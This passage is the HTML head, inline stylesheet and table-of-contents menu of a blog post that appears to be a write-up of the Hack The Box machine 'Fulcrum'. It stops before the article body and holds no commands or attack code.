<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="generator" content="Hugo 0.99.1" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<link rel="preload" href="https://alamot.github.io/css/noncrit.css" as="style" onload="this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://alamot.github.io/css/noncrit.css"></noscript>
<style>
button{overflow:visible}button,select{text-transform:none}button,html input[type="button"],input[type="reset"],input[type="submit"]{-webkit-appearance:button;cursor:pointer}button[disabled],html input[disabled]{cursor:default}
*{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}:before,:after{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}
input,button,select,textarea{font-family:inherit;font-size:inherit;line-height:inherit}
.sr-only{position:absolute;width:1px;height:1px;margin:-1px;padding:0;overflow:hidden;clip:rect(0,0,0,0);border:0}.sr-only-focusable:active,.sr-only-focusable:focus{position:static;width:auto;height:auto;margin:0;overflow:visible;clip:auto}
[role="button"]{cursor: pointer;}
.container{margin-right:auto;margin-left:auto;padding-left:15px;padding-right:15px}@media (min-width: 768px){.container{width:750px}}@media (min-width: 992px){.container{width:970px}}@media (min-width: 1200px){.container{width:1170px}}.container-fluid{margin-right:auto;margin-left:auto;padding-left:15px;padding-right:15px}.row{margin-left:-15px;margin-right:-15px}
.col-xs-1, .col-sm-1, .col-md-1, .col-lg-1, .col-xs-2, .col-sm-2, .col-md-2, .col-lg-2, .col-xs-3, .col-sm-3, .col-md-3, .col-lg-3, .col-xs-4, .col-sm-4, .col-md-4, .col-lg-4, .col-xs-5, .col-sm-5, .col-md-5, .col-lg-5, .col-xs-6, .col-sm-6, .col-md-6, .col-lg-6, .col-xs-7, .col-sm-7, .col-md-7, .col-lg-7, .col-xs-8, .col-sm-8, .col-md-8, .col-lg-8, .col-xs-9, .col-sm-9, .col-md-9, .col-lg-9, .col-xs-10, .col-sm-10, .col-md-10, .col-lg-10, .col-xs-11, .col-sm-11, .col-md-11, .col-lg-11, .col-xs-12, .col-sm-12, .col-md-12, .col-lg-12 { position: relative; min-height: 1px; padding-left: 15px; padding-right: 15px; }
@media (min-width: 768px){.col-sm-1,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9,.col-sm-10,.col-sm-11,.col-sm-12{float:left}.col-sm-12{width:100%}.col-sm-11{width:91.66666667%}.col-sm-10{width:83.33333333%}.col-sm-9{width:75%}.col-sm-8{width:66.66666667%}.col-sm-7{width:58.33333333%}.col-sm-6{width:50%}.col-sm-5{width:41.66666667%}.col-sm-4{width:33.33333333%}.col-sm-3{width:25%}.col-sm-2{width:16.66666667%}.col-sm-1{width:8.33333333%}.col-sm-pull-12{right:100%}.col-sm-pull-11{right:91.66666667%}.col-sm-pull-10{right:83.33333333%}.col-sm-pull-9{right:75%}.col-sm-pull-8{right:66.66666667%}.col-sm-pull-7{right:58.33333333%}.col-sm-pull-6{right:50%}.col-sm-pull-5{right:41.66666667%}.col-sm-pull-4{right:33.33333333%}.col-sm-pull-3{right:25%}.col-sm-pull-2{right:16.66666667%}.col-sm-pull-1{right:8.33333333%}.col-sm-pull-0{right:auto}.col-sm-push-12{left:100%}.col-sm-push-11{left:91.66666667%}.col-sm-push-10{left:83.33333333%}.col-sm-push-9{left:75%}.col-sm-push-8{left:66.66666667%}.col-sm-push-7{left:58.33333333%}.col-sm-push-6{left:50%}.col-sm-push-5{left:41.66666667%}.col-sm-push-4{left:33.33333333%}.col-sm-push-3{left:25%}.col-sm-push-2{left:16.66666667%}.col-sm-push-1{left:8.33333333%}.col-sm-push-0{left:auto}.col-sm-offset-12{margin-left:100%}.col-sm-offset-11{margin-left:91.66666667%}.col-sm-offset-10{margin-left:83.33333333%}.col-sm-offset-9{margin-left:75%}.col-sm-offset-8{margin-left:66.66666667%}.col-sm-offset-7{margin-left:58.33333333%}.col-sm-offset-6{margin-left:50%}.col-sm-offset-5{margin-left:41.66666667%}.col-sm-offset-4{margin-left:33.33333333%}.col-sm-offset-3{margin-left:25%}.col-sm-offset-2{margin-left:16.66666667%}.col-sm-offset-1{margin-left:8.33333333%}.col-sm-offset-0{margin-left:0}}@media (min-width: 992px){.col-md-1,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9,.col-md-10,.col-md-11,.col-md-12{float:left}.col-md-12{width:100%}.col-md-11{width:91.66666667%}.col-md-10{width:83.33333333%}.col-md-9{width:75%}.col-md-8{width:66.66666667%}.col-md-7{width:58.33333333%}.col-md-6{width:50%}.col-md-5{width:41.66666667%}.col-md-4{width:33.33333333%}.col-md-3{width:25%}.col-md-2{width:16.66666667%}.col-md-1{width:8.33333333%}.col-md-pull-12{right:100%}.col-md-pull-11{right:91.66666667%}.col-md-pull-10{right:83.33333333%}.col-md-pull-9{right:75%}.col-md-pull-8{right:66.66666667%}.col-md-pull-7{right:58.33333333%}.col-md-pull-6{right:50%}.col-md-pull-5{right:41.66666667%}.col-md-pull-4{right:33.33333333%}.col-md-pull-3{right:25%}.col-md-pull-2{right:16.66666667%}.col-md-pull-1{right:8.33333333%}.col-md-pull-0{right:auto}.col-md-push-12{left:100%}.col-md-push-11{left:91.66666667%}.col-md-push-10{left:83.33333333%}.col-md-push-9{left:75%}.col-md-push-8{left:66.66666667%}.col-md-push-7{left:58.33333333%}.col-md-push-6{left:50%}.col-md-push-5{left:41.66666667%}.col-md-push-4{left:33.33333333%}.col-md-push-3{left:25%}.col-md-push-2{left:16.66666667%}.col-md-push-1{left:8.33333333%}.col-md-push-0{left:auto}.col-md-offset-12{margin-left:100%}.col-md-offset-11{margin-left:91.66666667%}.col-md-offset-10{margin-left:83.33333333%}.col-md-offset-9{margin-left:75%}.col-md-offset-8{margin-left:66.66666667%}.col-md-offset-7{margin-left:58.33333333%}.col-md-offset-6{margin-left:50%}.col-md-offset-5{margin-left:41.66666667%}.col-md-offset-4{margin-left:33.33333333%}.col-md-offset-3{margin-left:25%}.col-md-offset-2{margin-left:16.66666667%}.col-md-offset-1{margin-left:8.33333333%}.col-md-offset-0{margin-left:0}}
label { display: inline-block; max-width: 100%; margin-bottom: 5px; font-weight: bold; }
.btn{display:inline-block;margin-bottom:0;font-weight:400;text-align:center;vertical-align:middle;-ms-touch-action:manipulation;touch-action:manipulation;cursor:pointer;background-image:none;border:1px solid transparent;white-space:nowrap;padding:6px 12px;font-size:16px;line-height:1.4;border-radius:4px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.btn:focus,.btn:active:focus,.btn.active:focus,.btn.focus,.btn:active.focus,.btn.active.focus{outline:5px auto -webkit-focus-ring-color;outline-offset:-2px}.btn:hover,.btn:focus,.btn.focus{color:#333;text-decoration:none}.btn:active,.btn.active{outline:0;background-image:none;-webkit-box-shadow:inset 0 3px 5px rgba(0,0,0,0.125);box-shadow:inset 0 3px 5px rgba(0,0,0,0.125)}.btn.disabled,.btn[disabled],fieldset[disabled] .btn{cursor:not-allowed;opacity:.65;filter:alpha(opacity=65);-webkit-box-shadow:none;box-shadow:none}a.btn.disabled,fieldset[disabled] a.btn{pointer-events:none}.btn-default{color:#333;background-color:#fff;border-color:#ccc}.btn-default:focus,.btn-default.focus{color:#333;background-color:#e6e6e6;border-color:#8c8c8c}.btn-default:hover{color:#333;background-color:#e6e6e6;border-color:#adadad}.btn-default:active,.btn-default.active,.open > .dropdown-toggle.btn-default{color:#333;background-color:#e6e6e6;border-color:#adadad}.btn-default:active:hover,.btn-default.active:hover,.open > .dropdown-toggle.btn-default:hover,.btn-default:active:focus,.btn-default.active:focus,.open > .dropdown-toggle.btn-default:focus,.btn-default:active.focus,.btn-default.active.focus,.open > .dropdown-toggle.btn-default.focus{color:#333;background-color:#d4d4d4;border-color:#8c8c8c}.btn-default:active,.btn-default.active,.open > .dropdown-toggle.btn-default{background-image:none}.btn-default.disabled:hover,.btn-default[disabled]:hover,fieldset[disabled] .btn-default:hover,.btn-default.disabled:focus,.btn-default[disabled]:focus,fieldset[disabled] .btn-default:focus,.btn-default.disabled.focus,.btn-default[disabled].focus,fieldset[disabled] .btn-default.focus{background-color:#fff;border-color:#ccc}.btn-default .badge{color:#fff;background-color:#333}.btn-primary{color:#fff;background-color:#195eff;border-color:#004cff}.btn-primary:focus,.btn-primary.focus{color:#fff;background-color:#0045e5;border-color:#00267f}.btn-primary:hover{color:#fff;background-color:#0045e5;border-color:#003ac1}.btn-primary:active,.btn-primary.active,.open > .dropdown-toggle.btn-primary{color:#fff;background-color:#0045e5;border-color:#003ac1}.btn-primary:active:hover,.btn-primary.active:hover,.open > .dropdown-toggle.btn-primary:hover,.btn-primary:active:focus,.btn-primary.active:focus,.open > .dropdown-toggle.btn-primary:focus,.btn-primary:active.focus,.btn-primary.active.focus,.open > .dropdown-toggle.btn-primary.focus{color:#fff;background-color:#003ac1;border-color:#00267f}.btn-primary:active,.btn-primary.active,.open > .dropdown-toggle.btn-primary{background-image:none}.btn-primary.disabled:hover,.btn-primary[disabled]:hover,fieldset[disabled] .btn-primary:hover,.btn-primary.disabled:focus,.btn-primary[disabled]:focus,fieldset[disabled] .btn-primary:focus,.btn-primary.disabled.focus,.btn-primary[disabled].focus,fieldset[disabled] .btn-primary.focus{background-color:#195eff;border-color:#004cff}.btn-primary .badge{color:#195eff;background-color:#fff}.btn-success{color:#fff;background-color:#00bc16;border-color:#00a313}.btn-success:focus,.btn-success.focus{color:#fff;background-color:#008910;border-color:#002304}.btn-success:hover{color:#fff;background-color:#008910;border-color:#00650c}.btn-success:active,.btn-success.active,.open > .dropdown-toggle.btn-success{color:#fff;background-color:#008910;border-color:#00650c}.btn-success:active:hover,.btn-success.active:hover,.open > .dropdown-toggle.btn-success:hover,.btn-success:active:focus,.btn-success.active:focus,.open > .dropdown-toggle.btn-success:focus,.btn-success:active.focus,.btn-success.active.focus,.open > .dropdown-toggle.btn-success.focus{color:#fff;background-color:#00650c;border-color:#002304}.btn-success:active,.btn-success.active,.open > .dropdown-toggle.btn-success{background-image:none}.btn-success.disabled:hover,.btn-success[disabled]:hover,fieldset[disabled] .btn-success:hover,.btn-success.disabled:focus,.btn-success[disabled]:focus,fieldset[disabled] .btn-success:focus,.btn-success.disabled.focus,.btn-success[disabled].focus,fieldset[disabled] .btn-success.focus{background-color:#00bc16;border-color:#00a313}.btn-success .badge{color:#00bc16;background-color:#fff}.btn-info{color:#fff;background-color:#5bc0de;border-color:#46b8da}.btn-info:focus,.btn-info.focus{color:#fff;background-color:#31b0d5;border-color:#1b6d85}.btn-info:hover{color:#fff;background-color:#31b0d5;border-color:#269abc}.btn-info:active,.btn-info.active,.open > .dropdown-toggle.btn-info{color:#fff;background-color:#31b0d5;border-color:#269abc}.btn-info:active:hover,.btn-info.active:hover,.open > .dropdown-toggle.btn-info:hover,.btn-info:active:focus,.btn-info.active:focus,.open > .dropdown-toggle.btn-info:focus,.btn-info:active.focus,.btn-info.active.focus,.open > .dropdown-toggle.btn-info.focus{color:#fff;background-color:#269abc;border-color:#1b6d85}.btn-info:active,.btn-info.active,.open > .dropdown-toggle.btn-info{background-image:none}.btn-info.disabled:hover,.btn-info[disabled]:hover,fieldset[disabled] .btn-info:hover,.btn-info.disabled:focus,.btn-info[disabled]:focus,fieldset[disabled] .btn-info:focus,.btn-info.disabled.focus,.btn-info[disabled].focus,fieldset[disabled] .btn-info.focus{background-color:#5bc0de;border-color:#46b8da}.btn-info .badge{color:#5bc0de;background-color:#fff}.btn-warning{color:#fff;background-color:#f0ad4e;border-color:#eea236}.btn-warning:focus,.btn-warning.focus{color:#fff;background-color:#ec971f;border-color:#985f0d}.btn-warning:hover{color:#fff;background-color:#ec971f;border-color:#d58512}.btn-warning:active,.btn-warning.active,.open > .dropdown-toggle.btn-warning{color:#fff;background-color:#ec971f;border-color:#d58512}.btn-warning:active:hover,.btn-warning.active:hover,.open > .dropdown-toggle.btn-warning:hover,.btn-warning:active:focus,.btn-warning.active:focus,.open > .dropdown-toggle.btn-warning:focus,.btn-warning:active.focus,.btn-warning.active.focus,.open > .dropdown-toggle.btn-warning.focus{color:#fff;background-color:#d58512;border-color:#985f0d}.btn-warning:active,.btn-warning.active,.open > .dropdown-toggle.btn-warning{background-image:none}.btn-warning.disabled:hover,.btn-warning[disabled]:hover,fieldset[disabled] .btn-warning:hover,.btn-warning.disabled:focus,.btn-warning[disabled]:focus,fieldset[disabled] .btn-warning:focus,.btn-warning.disabled.focus,.btn-warning[disabled].focus,fieldset[disabled] .btn-warning.focus{background-color:#f0ad4e;border-color:#eea236}.btn-warning .badge{color:#f0ad4e;background-color:#fff}.btn-danger{color:#fff;background-color:#d9534f;border-color:#d43f3a}.btn-danger:focus,.btn-danger.focus{color:#fff;background-color:#c9302c;border-color:#761c19}.btn-danger:hover{color:#fff;background-color:#c9302c;border-color:#ac2925}.btn-danger:active,.btn-danger.active,.open > .dropdown-toggle.btn-danger{color:#fff;background-color:#c9302c;border-color:#ac2925}.btn-danger:active:hover,.btn-danger.active:hover,.open > .dropdown-toggle.btn-danger:hover,.btn-danger:active:focus,.btn-danger.active:focus,.open > .dropdown-toggle.btn-danger:focus,.btn-danger:active.focus,.btn-danger.active.focus,.open > .dropdown-toggle.btn-danger.focus{color:#fff;background-color:#ac2925;border-color:#761c19}.btn-danger:active,.btn-danger.active,.open > .dropdown-toggle.btn-danger{background-image:none}.btn-danger.disabled:hover,.btn-danger[disabled]:hover,fieldset[disabled] .btn-danger:hover,.btn-danger.disabled:focus,.btn-danger[disabled]:focus,fieldset[disabled] .btn-danger:focus,.btn-danger.disabled.focus,.btn-danger[disabled].focus,fieldset[disabled] .btn-danger.focus{background-color:#d9534f;border-color:#d43f3a}.btn-danger .badge{color:#d9534f;background-color:#fff}.btn-link{color:#000;font-weight:400;border-radius:0}.btn-link,.btn-link:active,.btn-link.active,.btn-link[disabled],fieldset[disabled] .btn-link{background-color:transparent;-webkit-box-shadow:none;box-shadow:none}.btn-link,.btn-link:hover,.btn-link:focus,.btn-link:active{border-color:transparent}.btn-link:hover,.btn-link:focus{color:#000;text-decoration:none;background-color:transparent}.btn-link[disabled]:hover,fieldset[disabled] .btn-link:hover,.btn-link[disabled]:focus,fieldset[disabled] .btn-link:focus{color:#777;text-decoration:none}.btn-lg{padding:10px 16px;font-size:20px;line-height:1.3333333;border-radius:6px}.btn-sm{padding:5px 10px;font-size:14px;line-height:1.5;border-radius:3px}.btn-xs{padding:1px 5px;font-size:14px;line-height:1.5;border-radius:3px}.btn-block{display:block;width:100%}.btn-block + .btn-block{margin-top:5px}
.dropup,.dropdown{position:relative}.dropdown-toggle:focus{outline:0}.dropdown-menu{position:absolute;top:100%;left:0;z-index:1000;display:none;float:left;min-width:160px;padding:5px 0;margin:2px 0 0;list-style:none;font-size:16px;text-align:left;background-color:#fff;border:1px solid #ccc;border:1px solid rgba(0,0,0,0.15);border-radius:4px;-webkit-box-shadow:0 6px 12px rgba(0,0,0,0.175);box-shadow:0 6px 12px rgba(0,0,0,0.175);-webkit-background-clip:padding-box;background-clip:padding-box}.dropdown-menu.pull-right{right:0;left:auto}.dropdown-menu .divider{height:1px;margin:10px 0;overflow:hidden;background-color:#e5e5e5}.dropdown-menu > li > a{display:block;padding:3px 10px;clear:both;font-weight:400;line-height:1.4;color:#333;white-space:nowrap}.dropdown-menu > li > a:hover,.dropdown-menu > li > a:focus{text-decoration:none;color:#262626;background-color:#f5f5f5}.dropdown-menu > .active > a,.dropdown-menu > .active > a:hover,.dropdown-menu > .active > a:focus{color:#fff;text-decoration:none;outline:0;background-color:#195eff}.dropdown-menu > .disabled > a,.dropdown-menu > .disabled > a:hover,.dropdown-menu > .disabled > a:focus{color:#777}.dropdown-menu > .disabled > a:hover,.dropdown-menu > .disabled > a:focus{text-decoration:none;background-color:transparent;background-image:none;filter:progid:DXImageTransform.Microsoft.gradient(enabled = false);cursor:not-allowed}.open > .dropdown-menu{display:block}.open > a{outline:0}.dropdown-menu-right{left:auto;right:0}.dropdown-menu-left{left:0;right:auto}.dropdown-header{display:block;padding:3px 10px;font-size:14px;line-height:1.4;color:#777;white-space:nowrap}.dropdown-backdrop{position:fixed;left:0;right:0;bottom:0;top:0;z-index:990}.pull-right > .dropdown-menu{right:0;left:auto}.dropup .caret,.navbar-fixed-bottom .dropdown .caret{border-top:0;border-bottom:4px dashed;border-bottom:4px solid \9;content:""}.dropup .dropdown-menu,.navbar-fixed-bottom .dropdown .dropdown-menu{top:auto;bottom:100%;margin-bottom:2px}
.nav{margin-bottom:0;padding-left:0;list-style:none}.nav > li{position:relative;display:block}.nav > li > a{position:relative;display:block;padding:5px 10px}.nav > li > a:hover,.nav > li > a:focus{text-decoration:none;background-color:#a52a2a}.nav > li.disabled > a{color:#777}.nav > li.disabled > a:hover,.nav > li.disabled > a:focus{color:#777;text-decoration:none;background-color:transparent;cursor:not-allowed}.nav .open > a,.nav .open > a:hover,.nav .open > a:focus{background-color:#a52a2a;border-color:#000}.nav .nav-divider{height:1px;margin:10px 0;overflow:hidden;background-color:#e5e5e5}.nav > li > a > img{max-width:none}.nav-pills > li{float:left}.nav-pills > li > a{border-radius:4px}.nav-pills > li + li{margin-left:2px}.nav-pills > li.active > a,.nav-pills > li.active > a:hover,.nav-pills > li.active > a:focus{color:#fff;background-color:#195eff}.nav-stacked > li{float:none}.nav-stacked > li + li{margin-top:0px;margin-left:0}.navbar{position:relative;min-height:48px;max-height:48px;margin-bottom:22px;border:1px solid transparent}@media (min-width: 768px){.navbar{border-radius:4px}}@media (max-device-width: 480px) and (orientation: landscape){.navbar-fixed-top .navbar-collapse,.navbar-fixed-bottom .navbar-collapse{max-height:200px}}.navbar-static-top{z-index:1000;border-width:0 0 1px}@media (min-width: 768px){.navbar-static-top{border-radius:0}}.navbar-fixed-top,.navbar-fixed-bottom{position:fixed;right:0;left:0;z-index:1030}@media (min-width: 768px){.navbar-fixed-top,.navbar-fixed-bottom{border-radius:0}}.navbar-fixed-top{top:0;border-width:0 0 1px}.navbar-fixed-bottom{bottom:0;margin-bottom:0;border-width:1px 0 0}@media (min-width: 768px){.navbar > .container .navbar-brand,.navbar > .container-fluid .navbar-brand{margin-left:-15px}}.navbar-fixed-bottom .navbar-nav > li > .dropdown-menu{margin-bottom:0;border-top-right-radius:4px;border-top-left-radius:4px;border-bottom-right-radius:0;border-bottom-left-radius:0}.navbar-default{background-color:#7d1935;border-color:#611329}.navbar-default .navbar-nav > li > a{color:#fff}.navbar-default .navbar-nav > li > a:hover,.navbar-default .navbar-nav > li > a:focus{color:#fff;background-color:#a52a2a}.navbar-default .navbar-nav > .active > a,.navbar-default .navbar-nav > .active > a:hover,.navbar-default .navbar-nav > .active > a:focus{color:#fff;background-color:#611329}.navbar-default .navbar-nav > .disabled > a,.navbar-default .navbar-nav > .disabled > a:hover,.navbar-default .navbar-nav > .disabled > a:focus{color:#ccc;background-color:transparent}.navbar-default .navbar-toggle{border-color:#a52a2a}.navbar-default .navbar-toggle:hover,.navbar-default .navbar-toggle:focus{background-color:#a52a2a}.navbar-default .navbar-toggle .icon-bar{background-color:#888}.navbar-default .navbar-collapse,.navbar-default .navbar-form{border-color:#611329}.navbar-default .navbar-nav > .open > a,.navbar-default .navbar-nav > .open > a:hover,.navbar-default .navbar-nav > .open > a:focus{background-color:#611329;color:#fff}@media (max-width: 767px){.navbar-default .navbar-nav .open .dropdown-menu > li > a{color:#fff}.navbar-default .navbar-nav .open .dropdown-menu > li > a:hover,.navbar-default .navbar-nav .open .dropdown-menu > li > a:focus{color:#fff;background-color:#a52a2a}.navbar-default .navbar-nav .open .dropdown-menu > .active > a,.navbar-default .navbar-nav .open .dropdown-menu > .active > a:hover,.navbar-default .navbar-nav .open .dropdown-menu > .active > a:focus{color:#fff;background-color:#611329}.navbar-default .navbar-nav .open .dropdown-menu > .disabled > a,.navbar-default .navbar-nav .open .dropdown-menu > .disabled > a:hover,.navbar-default .navbar-nav .open .dropdown-menu > .disabled > a:focus{color:#ccc;background-color:transparent}}.navbar-default .navbar-link{color:#fff}.navbar-default .navbar-link:hover{color:#fff}.navbar-default .btn-link{color:#fff}.navbar-default .btn-link:hover,.navbar-default .btn-link:focus{color:#fff}
.label{display:inline;padding:.2em .6em .3em;font-size:75%;font-weight:700;line-height:1;color:#fff;text-align:center;white-space:nowrap;vertical-align:baseline;border-radius:.25em}a.label:hover,a.label:focus{color:#fff;text-decoration:none;cursor:pointer}.label:empty{display:none}.btn .label{position:relative;top:-1px}.label-default{background-color:#777}.label-default[href]:hover,.label-default[href]:focus{background-color:#5e5e5e}.label-primary{background-color:#195eff}.label-primary[href]:hover,.label-primary[href]:focus{background-color:#0045e5}.label-success{background-color:#00bc16}.label-success[href]:hover,.label-success[href]:focus{background-color:#008910}.label-info{background-color:#5bc0de}.label-info[href]:hover,.label-info[href]:focus{background-color:#31b0d5}.label-warning{background-color:#f0ad4e}.label-warning[href]:hover,.label-warning[href]:focus{background-color:#ec971f}.label-danger{background-color:#d9534f}.label-danger[href]:hover,.label-danger[href]:focus{background-color:#c9302c}.badge{display:inline-block;min-width:10px;padding:3px 7px;font-size:14px;font-weight:700;color:#fff;line-height:1;vertical-align:middle;white-space:nowrap;text-align:center;background-color:#000;border-radius:10px}.badge:empty{display:none}.btn .badge{position:relative;top:-1px}.btn-xs .badge,.btn-group-xs > .btn .badge{top:0;padding:1px 5px}a.badge:hover,a.badge:focus{color:#fff;text-decoration:none;cursor:pointer}
.nav-pills > .active > a > .badge{color:#000;background-color:#fff}.nav-pills > li > a > .badge{margin-left:3px}
.clearfix:before,.clearfix:after,.container:before,.container:after,.container-fluid:before,.container-fluid:after,.row:before,.row:after,.form-horizontal .form-group:before,.form-horizontal .form-group:after,.nav:before,.nav:after,.navbar:before,.navbar:after,.navbar-header:before,.navbar-header:after,.navbar-collapse:before,.navbar-collapse:after{content:" ";display:table}.clearfix:after,.container:after,.container-fluid:after,.row:after,.form-horizontal .form-group:after,.nav:after,.navbar:after,.navbar-header:after,.navbar-collapse:after{clear:both}
.pull-right { float: right !important; } .pull-left { float: left !important; }

 
html { font-size:16px; }
body:not(.en) :lang(en), body:not(.el) :lang(el), body:not(.fr) :lang(fr) { display: none; }
body {
  font-size: 16px; line-height: 1.45; color: #000000;  background-color: #eceff1;
  margin: 0; padding-top: 70px; 
  font-family: 'Open Sans', 'Times New Roman', sans-serif;
  -webkit-animation: bugfix infinite 1s;
}
@-webkit-keyframes bugfix { from { fill: 0; } to { fill: 0; } }

a { color: #000; word-wrap: break-word; text-decoration: none; }
a:hover, a:focus, a:active { color: black; text-decoration: none; }
a.label { box-shadow: 2px 3px 4px 0px rgba(0,0,0,0.75); }
figure {  display: table; margin: 10px auto; }
figure figcaption { caption-side: bottom; color: darkblue; display: table-caption;
font-size: 14px; margin-top: 5px; text-align:justify; }
h1, h2, h3, h4, h5, h6 { margin:0px; text-align: justify; }
img { max-width: 100%; }
img.bordered { border:1px solid #021a40;  border-radius:20px; box-shadow: 2px 3px 4px 0px rgba(0,0,0,0.75); }
li { line-height: 1.5rem; text-align:justify; }
p { text-align:justify; text-indent: 30px; }
section { margin-top: 1rem; margin-bottom: 1rem; }
section>header { margin-bottom: .3rem; }
ul, ol { padding-left: 1.5rem; }

article .image { background-size: cover; background-position: center; }
article time { font-size: .8rem; }
article.grid { max-width:384px; margin-bottom:0.5rem; height:26rem; overflow: hidden; }
article.grid .image { min-height: 12rem; }
article.grid footer { padding: 1rem; background-color: #ffffe6; }
article.grid .title { overflow: hidden; }
article.grid .summary { color: #333; font-size: .8rem; line-height: 1rem; max-height: 5rem; overflow: hidden; }
article.single { background-color: #fff; margin: 0 auto; padding-bottom: 1rem; max-width:1200px; }
article.single .image { max-width:786px; min-height: 24rem; margin-left:auto; margin-right:auto; }
article.single .body { margin-bottom: 2rem;  padding: 0 5rem; }
article.single .body a:not(.label) { color: #78909c; text-decoration: underline; }
article.single .body>h1, article.single .body>h2, article.single .body>h3 { padding-top: 60px; margin-top: -30px; margin-bottom: 0.5rem; }
article.single .body li {  margin: 0.5rem auto; }
article.li { margin-bottom: .5rem; font-size: .8rem; line-height: 1rem; }
article.li .cell { display:table-cell; vertical-align: middle; }
article.li .image { width: 4.1rem; height: 4.1rem; box-shadow: 2px 3px 4px 0px rgba(0,0,0,0.75); }
article.li footer { display:table-cell; vertical-align: middle; padding-left: .5rem;  }
article.li time { font-size: .7rem; }
article.li .title { font-size: 0.85rem; line-height: 1rem; font-weight: 700; }

.body .title { font-size: 2rem; line-height: 3rem; margin: 0.5rem auto; }
.label { display:inline-block; padding-top: 0.25rem; }

.navbar * { color: white !important; }
.navbar .dropdown-menu a:hover { background-color: brown; }
.nav>li>a:hover, .nav>li>a:focus { color: white; background-color: brown; }
.nav-pills { display: inline-block; margin: 0; }
.nav-pills>li.active>a { font-weight: 700 !important; background-color: #00bc16 !important; }
.nav-pills>li.active>a .badge { color: #00bc16; }
.cssdropdown { margin-top: 2rem; }
.cssdropdown input[type=checkbox], .cssdropdown ul { display: none; }
.cssdropdown label { font-size: 1.25rem; font-weight:700; min-width: 300px; }
.cssdropdown input[type=checkbox]:checked ~ ul { display: table-cell; }

.p-logo {
  font-family: 'Comic Sans MS', cursive; font-weight: bold; font-size: 2rem;
  text-shadow: 4px 2px 2px rgba(0,0,0,0.75);
  margin-top: 3px;
}
.l-footer * { color: white; }
.l-footer { background-color: #7D1935; padding: 0.75rem 0; text-align: center; }

.lgfont { font-size: 2rem; }
.margin-sm { margin: 0.5rem; }
.side-margins-1 { margin-left: 1rem !important; margin-right: 1rem !important; }
.side-margins-2 { margin-left: 2rem !important;; margin-right: 2rem !important; }
.margin-top-sm {  margin-top: 0.5rem; }
.topmargin5 {  margin-top: 5px; }
.topmargin7 { margin-top: 7px; }

#search-section, #results-section { display:none; }
#TableOfContents ul { list-style: none; }
#TableOfContents>ul {  padding-left: 0; font-weight: 700; }
#TableOfContents>ul ul { font-weight: normal; }

.summary { text-align:justify; }
.max-width640 { max-width: 640px; }
.floatleft { float:left; margin-right: 10px; }
.floatright { float:right; margin-left: 10px; }

.centered { margin-left: auto !important;  margin-right: auto !important; }
img.centered { display:block !important; }
div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.centered, h2.centered, h3.centered { text-align:center !important; }

@media (max-width: 768px) {
  h1 { font-size: 1.4rem; line-height: 1.5rem; }
  h2 { font-size: 1.2rem; line-height: 1.5rem; }
  article.single .image { min-height: 12rem; }
  article.single .body pre { margin: 1rem -1rem; }
  article.single .body pre code { padding: 1rem 1rem; }
  article.single .body { padding: 0 1rem; }
  ul.scroll-menu { max-height: 250px; }
  .cssdropdown label, .nav-stacked>li>a { min-width: 240px; }
  .hidden768 { display:none; }
  .text-smaller {
    font-family: 'Open Sans', 'Times New Roman', sans-serif;
    font-size: 1rem;  font-weight: 700; letter-spacing: -1px;
    padding-left: 0px !important;  padding-right: 0px !important;
    line-height:32px;
  }
}
</style>
<link rel="alternate" type="application/rss+xml" title="RSS" href="https://alamot.github.io/index.xml">

  <link href="https://alamot.github.io/index.xml" rel="alternate" type="application/rss+xml" title="The Portal of Knowledge" />


  <title>Fulcrum write-up - The Portal of Knowledge</title>
  <meta property='og:title' content="Fulcrum write-up - The Portal of Knowledge">
  <meta property="og:type" content="article">
  <meta name="description" content="Write-up for the Fulcrum machine (www.hackthebox.eu). Ανάλυση του μηχανήματος Fulcrum του www.hackthebox.eu (διαθέσιμη μόνο στα αγγλικά).">
  <meta property="og:description" content="Write-up for the Fulcrum machine (www.hackthebox.eu). Ανάλυση του μηχανήματος Fulcrum του www.hackthebox.eu (διαθέσιμη μόνο στα αγγλικά).">
  <meta property="og:image" content="https://alamot.github.io/images/fulcrum.jpg">
  <meta property="og:image:width" content="768" />
  <meta property="og:image:height" content="384" />

<meta property="og:url" content="https://alamot.github.io/fulcrum_writeup/">


<script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "mainEntityOfPage":{
      "@type":"WebPage",
      "@id":"https:\/\/alamot.github.io\/"
    },
    "headline": "Fulcrum write-up |  ",
    "image": {
      "@type": "ImageObject",
      "url": "",
      "height": 700,
      "width": 700
    },
    "datePublished": "2018-06-09T00:00:00JST",
    "dateModified": "2018-06-09T00:00:00JST",
    "author": {
      "@type": "Person",
      "name": "Antonios Tsolis",
      "image": "https:\/\/alamot.github.io\/images/logo.png"
    },
    "publisher": {
      "@type": "Organization",
      "name": "",
      "logo": {
        "@type": "ImageObject",
        "url": "https:\/\/alamot.github.io\/images/logo.png",
        "height": 60,
        "width": 60
      }
    },
    "description": ""
  }
</script>
</head>
<body id="mainbody" class="en" lang="en">
<nav class="navbar navbar-default navbar-fixed-top centered">
<div class="container-fluid">
  
   <ul class="nav nav-pills pull-left topmargin7">
    <li id="content-selector" role="presentation" class="dropdown">
    <a class="dropdown-toggle btn-danger" data-toggle="dropdown" href="#" role="button" aria-haspopup="true" aria-expanded="false"><span lang="en">Contents</span><span lang="el">Περιεχόμενα</span> <i class="fa fa-caret-down" aria-hidden="true"></i></a>
      <ul class="dropdown-menu scroll-menu">
        <li><a href="#title"><span lang="en">Start</span><span lang="el">Αρχή</span></a></li>
        
        
        
         
<li><a href="#enumeration">Enumeration</a>
<ul>
<li><a href="#port-scanning">Port scanning</a></li>
</ul></li>
<li><a href="#finding-an-entry-point-i-e-getting-a-shell">Finding an entry point (i.e. getting a shell)</a>
<ul>
<li><a href="#getting-shell-on-the-webserver-as-webuser">Getting shell on the webserver as WebUser</a></li>
</ul></li>
<li><a href="#getting-ldap-credentials">Getting LDAP credentials</a>
<ul>
